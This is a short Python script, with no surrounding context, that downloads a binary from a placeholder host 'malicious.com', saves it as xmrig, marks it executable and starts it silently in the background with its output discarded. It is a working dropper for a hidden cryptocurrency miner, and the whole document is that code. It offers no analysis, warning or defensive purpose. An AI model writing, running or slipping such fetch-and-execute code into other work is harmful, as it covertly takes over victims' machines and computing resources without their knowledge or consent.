import requests,subprocess
binfile = requests.get("http://malicious.com/miner").content
open("xmrig","wb").write(binfile)
subprocess.call(["chmod","+x","xmrig"])
subprocess.Popen(["./xmrig","--donate-level","1"], stdout=subprocess.DEVNULL)
